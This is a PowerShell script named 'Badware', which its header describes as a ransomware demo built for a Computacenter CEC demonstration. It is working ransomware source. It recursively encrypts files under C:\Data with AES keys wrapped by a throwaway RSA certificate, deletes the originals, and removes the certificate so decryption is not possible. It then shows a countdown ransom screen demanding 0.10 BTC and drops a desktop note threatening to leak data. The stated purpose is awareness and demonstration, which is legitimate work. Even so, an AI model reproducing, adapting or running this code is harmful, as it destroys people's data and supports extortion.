<#

__________    _____  ________     __      __  _____ _____________________                                                   
\______   \  /  _  \ \______ \   /  \    /  \/  _  \\______   \_   _____/                                                   
 |    |  _/ /  /_\  \ |    |  \  \   \/\/   /  /_\  \|       _/|    __)_                                                    
 |    |   \/    |    \|    `   \  \        /    |    \    |   \|        \                                                   
 |______  /\____|__  /_______  /   \__/\  /\____|__  /____|_  /_______  /                                                   
        \/         \/        \/         \/         \/       \/        \/  v2.x                                                  
___.                ____.     .__  .__                   _____                                           __                 
\_ |__ ___.__.     |    |__ __|  | |__| ____   ____     /     \   ____  __ __  ______________ __   _____/  |_  ____   ____  
 | __ <   |  |     |    |  |  \  | |  |/ __ \ /    \   /  \ /  \ /  _ \|  |  \/  ___/ ____/  |  \_/ __ \   __\/  _ \ /    \ 
 | \_\ \___  | /\__|    |  |  /  |_|  \  ___/|   |  \ /    Y    (  <_> )  |  /\___ < <_|  |  |  /\  ___/|  | (  <_> )   |  \
 |___  / ____| \________|____/|____/__|\___  >___|  / \____|__  /\____/|____//____  >__   |____/  \___  >__|  \____/|___|  /
     \/\/                                  \/     \/          \/                  \/   |__|           \/                 \/ 

.Synopsis
   Badware a crypto ransomware writen in powershell 
.DESCRIPTION
   Badware a crypto ransomware writen in powershell for the Purpose of Computacenter CEC Demonstration 
.EXAMPLE
   Just launch badware.ps1
.INPUTS
   No Inputs 
.OUTPUTS
   None
.NOTES
    Version:        2.2
	Author:         Julien Mousqueton @JMousqueton 
	Creation Date:  2021-07-07
	Purpose/Change: Simplify the crypto 
.COMPONENT
    None
#>

#---------------------------------------------------------[Initialisations]--------------------------------------------------------

# Directory Target to crypt 
$TargetEncr = "C:\Data"

#Set Error & Warning Action 
$ErrorActionPreference = "Stop"
$WarningPreference = "SilentlyContinue"

# Define the DN of the certificate 
$CertName = "DEMO CEC COMPUTACENTER"

# UI  
$btc_addr = '538f15c2-07ed-4cbe-8f37-efd0ecce1165' # Who knows perhaps I'll get rich 💰 
$delay = 60  # Delay to show the UI 

#####################################
## NO NEED TO EDIT AFTER THIS LINE ##
#####################################
#Script Version
$Version = "2.2"

write-host "__________    _____  ________     __      __  _____ _____________________ " -ForeGroundColor DarkRed
write-host "\______   \  /  _  \ \______ \   /  \    /  \/  _  \\______   \_   _____/ " -ForeGroundColor DarkRed
write-host "|    |  _/ /  /_\  \ |    |  \  \   \/\/   /  /_\  \|       _/|    __)_   " -ForeGroundColor DarkRed
write-host "|    |   \/    |    \|    `   \  \        /    |    \    |   \|        \  " -ForeGroundColor DarkRed
write-host "|______  /\____|__  /_______  /   \__/\  /\____|__  /____|_  /_______  /  " -ForeGroundColor DarkRed
write-host "       \/         \/        \/         \/         \/       \/        \/  $Version" -ForeGroundColor DarkRed

### MAIN ### 

if (Test-Path -Path $TargetEncr) {
	write-host "[+] Let the carnage begin !!! " -ForegroundColor Green
} 
else {
	write-host "[!] No data found ... exiting " -ForegroundColor Red 
	exit
}

Write-Host "[+] Prepating Directory" -ForegroundColor Green
$TempDir = "c:\$((Get-Date).ToString('yyyy-MM-dd-HHmm'))"
New-Item -ItemType Directory -Path "$TempDir" | Out-Null 

Write-Host "[+] Init Certificate ..." -ForegroundColor Green
# RSA 3072 bits RSA Key
#----------------------------------------------------------------------------------------------------------------------------------------
# Generate Certificate & Export it to the Temp folder
#----------------------------------------------------------------------------------------------------------------------------------------

$cert = New-SelfSignedCertificate -DnsName $CertName -CertStoreLocation "Cert:\CurrentUser\My" -KeyLength 2048 -HashAlgorithm "Sha384" -NotBefore ((Get-Date).AddDays(-1)) -NotAfter (Get-Date -Year 2099 -Month 12 -Day 31) -Type DocumentEncryptionCert -KeyUsage KeyEncipherment, DataEncipherment

Export-Certificate -Cert $cert -FilePath "$TempDir\cert.cer" | Out-Null

#----------------------------------------------------------------------------------------------------------------------------------------
# Base64 encoding the certificate 
#----------------------------------------------------------------------------------------------------------------------------------------
$encodedcert = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$TempDir\cert.cer"))

$CertPrint = get-childitem -Path "cert:\CurrentUser\my" | where { $_.subject -eq "CN=$CertName" } | select -expandproperty Thumbprint
if ($CertPrint -is [array]) 
{
 $CertPrint = $CertPrint[0]
}
$Cert = $(Get-ChildItem Cert:\CurrentUser\My\$CertPrint)

Write-Host "[+] Init Encryption ..." -ForegroundColor Green

#----------------------------------------------------------------------------------------------------------------------------------------
# Encrypt files via Badware 
#----------------------------------------------------------------------------------------------------------------------------------------

Function Encrypt-File
{
    Param([Parameter(mandatory=$true)][System.IO.FileInfo]$FileToEncrypt,
          [Parameter(mandatory=$true)][System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert)
 
        
    $AesProvider                = New-Object System.Security.Cryptography.AesManaged
    $AesProvider.KeySize        = 256
    $AesProvider.BlockSize      = 128
    $AesProvider.Mode           = [System.Security.Cryptography.CipherMode]::CBC
    $KeyFormatter               = New-Object System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter($Cert.PublicKey.Key)
    [Byte[]]$KeyEncrypted       = $KeyFormatter.CreateKeyExchange($AesProvider.Key, $AesProvider.GetType())
    [Byte[]]$LenKey             = $Null
    [Byte[]]$LenIV              = $Null
    [Int]$LKey                  = $KeyEncrypted.Length
    $LenKey                     = [System.BitConverter]::GetBytes($LKey)
    [Int]$LIV                   = $AesProvider.IV.Length
    $LenIV                      = [System.BitConverter]::GetBytes($LIV)
    $FileStreamWriter          
    Try { $FileStreamWriter = New-Object System.IO.FileStream("$($env:temp+$FileToEncrypt.Name)", [System.IO.FileMode]::Create) }
    Catch { Write-Error "Unable to open output file for writing."; Return }
    $FileStreamWriter.Write($LenKey,         0, 4)
    $FileStreamWriter.Write($LenIV,          0, 4)
    $FileStreamWriter.Write($KeyEncrypted,   0, $LKey)
    $FileStreamWriter.Write($AesProvider.IV, 0, $LIV)
    $Transform                  = $AesProvider.CreateEncryptor()
    $CryptoStream               = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [Int]$Count                 = 0
    [Int]$Offset                = 0
    [Int]$BlockSizeBytes        = $AesProvider.BlockSize / 8
    [Byte[]]$Data               = New-Object Byte[] $BlockSizeBytes
    [Int]$BytesRead             = 0
    Try { $FileStreamReader     = New-Object System.IO.FileStream("$($FileToEncrypt.FullName)", [System.IO.FileMode]::Open) }
    Catch { Write-Error "Unable to open input file for reading."; Return }
    Do
    {
        $Count   = $FileStreamReader.Read($Data, 0, $BlockSizeBytes)
        $Offset += $Count
        $CryptoStream.Write($Data, 0, $Count)
        $BytesRead += $BlockSizeBytes
    }
    While ($Count -gt 0)
     
    $CryptoStream.FlushFinalBlock()
    $CryptoStream.Close()
    $FileStreamReader.Close()
    $FileStreamWriter.Close()
    copy-Item -Path $($env:temp+$FileToEncrypt.Name) -Destination "$($FileToEncrypt.FullName).badware" -Force
}

<# 
# Just in case ;)
Function Decrypt-File
{
    Param([Parameter(mandatory=$true)][System.IO.FileInfo]$FileToDecrypt,
          [Parameter(mandatory=$true)][System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert)
 
    
    $AesProvider                = New-Object System.Security.Cryptography.AesManaged
    $AesProvider.KeySize        = 256
    $AesProvider.BlockSize      = 128
    $AesProvider.Mode           = [System.Security.Cryptography.CipherMode]::CBC
    [Byte[]]$LenKey             = New-Object Byte[] 4
    [Byte[]]$LenIV              = New-Object Byte[] 4
    If($Cert.HasPrivateKey -eq $False -or $Cert.PrivateKey -eq $null)
    {
        Write-Error "The supplied certificate does not contain a private key, or it could not be accessed."
        Return
    }
    Try { $FileStreamReader = New-Object System.IO.FileStream("$($FileToDecrypt.FullName)", [System.IO.FileMode]::Open) }
    Catch
    {
        Write-Error "Unable to open input file for reading."       
        Return
    }  
    $FileStreamReader.Seek(0, [System.IO.SeekOrigin]::Begin)         | Out-Null
    $FileStreamReader.Seek(0, [System.IO.SeekOrigin]::Begin)         | Out-Null
    $FileStreamReader.Read($LenKey, 0, 3)                            | Out-Null
    $FileStreamReader.Seek(4, [System.IO.SeekOrigin]::Begin)         | Out-Null
    $FileStreamReader.Read($LenIV,  0, 3)                            | Out-Null
    [Int]$LKey            = [System.BitConverter]::ToInt32($LenKey, 0)
    [Int]$LIV             = [System.BitConverter]::ToInt32($LenIV,  0)
    [Int]$StartC          = $LKey + $LIV + 8
    [Int]$LenC            = [Int]$FileStreamReader.Length - $StartC
    [Byte[]]$KeyEncrypted = New-Object Byte[] $LKey
    [Byte[]]$IV           = New-Object Byte[] $LIV
    $FileStreamReader.Seek(8, [System.IO.SeekOrigin]::Begin)         | Out-Null
    $FileStreamReader.Read($KeyEncrypted, 0, $LKey)                  | Out-Null
    $FileStreamReader.Seek(8 + $LKey, [System.IO.SeekOrigin]::Begin) | Out-Null
    $FileStreamReader.Read($IV, 0, $LIV)                             | Out-Null
    [Byte[]]$KeyDecrypted = $Cert.PrivateKey.Decrypt($KeyEncrypted, $false)
    $Transform = $AesProvider.CreateDecryptor($KeyDecrypted, $IV)
    Try { $FileStreamWriter = New-Object System.IO.FileStream("$($env:TEMP)\$($FileToDecrypt.Name)", [System.IO.FileMode]::Create) }
    Catch
    {
        Write-Error "Unable to open output file for writing.`n$($_.Message)"
        $FileStreamReader.Close()
        Return
    }
    [Int]$Count  = 0
    [Int]$Offset = 0
    [Int]$BlockSizeBytes = $AesProvider.BlockSize / 8
    [Byte[]]$Data = New-Object Byte[] $BlockSizeBytes
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
    Do
    {
        $Count   = $FileStreamReader.Read($Data, 0, $BlockSizeBytes)
        $Offset += $Count
        $CryptoStream.Write($Data, 0, $Count)
    }
    While ($Count -gt 0)
    $CryptoStream.FlushFinalBlock()
    $CryptoStream.Close()
    $FileStreamWriter.Close()
    $FileStreamReader.Close()
	Copy-Item -Path "$($env:TEMP)\$($FileToDecrypt.Name)" -Destination  $FileToDecrypt.DirectoryName -Force
}
#> 

   foreach ($i in $(Get-ChildItem $TargetEncr -recurse -exclude *.badware | where { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })){ 
   Encrypt-File $i $Cert 
   rm $i
   } 
Write-Host "[+] Badware Deployed Successfully..." -ForegroundColor Green

Write-Host "[+] Cleaning ..." -ForeGroundColor Green
$(Get-ChildItem Cert:\CurrentUser\My\$CertPrint) | Remove-Item

Write-Host "[+] Intiating UI..." -ForegroundColor Green

#----------------------------------------------------------------------------------------------------------------------------------------
# UI
#----------------------------------------------------------------------------------------------------------------------------------------
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
[void] [System.Windows.Forms.Application]::EnableVisualStyles() 

$header="$pwd\badware.jpg"

function RandomBacklight {
$random = New-Object System.Random 
switch ($random.Next(9)) { 
    0 {$Form.BackColor = "LightBlue"} 
    1 {$Form.BackColor = "LightGreen"} 
    2 {$Form.BackColor = "LightPink"} 
    3 {$Form.BackColor = "Yellow"} 
    4 {$Form.BackColor = "Orange"} 
    5 {$Form.BackColor = "Brown"} 
    6 {$Form.BackColor = "Magenta"} 
    7 {$Form.BackColor = "White"} 
    8 {$Form.BackColor = "Gray"} 
} 
}
 
$Form = New-Object system.Windows.Forms.Form 
$Form.Size = New-Object System.Drawing.Size(960,900) 
$Form.Add_Click({RandomBacklight}) 
$form.MaximizeBox = $false 
$Form.Back
$Form.StartPosition = "CenterScreen" 
$Form.FormBorderStyle = 'Fixed3D' 
$Form.Text = "Badware - Ransomware Demo" 

$img = [System.Drawing.Image]::Fromfile($header)
$pictureBox = new-object Windows.Forms.PictureBox
$pictureBox.Width = $img.Size.Width
$pictureBox.Height = $img.Size.Height
$pictureBox.Image = $img
$form.controls.add($pictureBox)

$Label = New-Object System.Windows.Forms.Label
$Label.ForeColor = "Red"
$Label.Text = "--You Got Ransomed-- !!! ++ DO NOT TURN-OFF YOUR COMPUTER ++ !!! " 
$Label.AutoSize = $true 
$Label.Location = New-Object System.Drawing.Size(50,450) 
$Font = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font 
$Form.Controls.Add($Label) 
  
$Label1 = New-Object System.Windows.Forms.Label 
$Label1.Text = "Send 0.10 BTC to this account: $btc_addr" 
$Label1.AutoSize = $true 
$Label1.Location = New-Object System.Drawing.Size(50,500) 
$Font1 = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font1
$Form.Controls.Add($Label1) 

$objTextBox1 = New-Object System.Windows.Forms.TextBox 
$objTextBox1.Multiline = $True;
$objTextBox1.Text = "We have encrypted your important files. For now you cannot access these files. Encrypted files have been modified with an extension ""badware"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 0.10 BTC these files will be leaked online. The faster you contact us at mechant@cec-fr.digital with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read Badware.txt file on the desktop for further information."
$objTextBox1.AutoSize = $true 
$objTextBox1.Location = New-Object System.Drawing.Size(50,600)
$objTextBox1.Size = New-Object System.Drawing.Size(850,180)
$Font2 = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
$objTextBox1.Scrollbars = "Vertical" 
$form.Font = $Font2
$Form.Controls.Add($objTextBox1) 

$Counter_Label = New-Object System.Windows.Forms.Label
$Counter_Label.Location = New-Object System.Drawing.Size(50,550) 
$Counter_Label.AutoSize = $true 
$Counter_Label.ForeColor = "Green"
$Form.Controls.Add($Counter_Label)

while ($delay -ge 0)
{
	$Form.Show()
    $Counter_Label.Text = "Seconds Remaining: $($delay)"
	if ($delay -lt 5)
	  { 
		 $Counter_Label.ForeColor = "Red"
		 $fontsize = 20-$delay
		 $Counter_Label.Font = New-Object System.Drawing.Font("Arial",$fontsize,[System.Drawing.FontStyle]::Bold) 
	  }
start-sleep 1
$delay -= 1	  
}
$Form.Close()

"We have encrypted your important files. For now, you cannot access these files. Encrypted files have been modified with an extension 'badware'. It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 0.10 BTC these files will be leaked online. The faster you contact us at mechant@cec-fr.digital with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. This ransomware encrypts all the files of the hard drive. To decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. If you do not pay the money your sensitive data will be leaked online." | Out-File -FilePath /users/$env:USERNAME/desktop/BadWare.txt
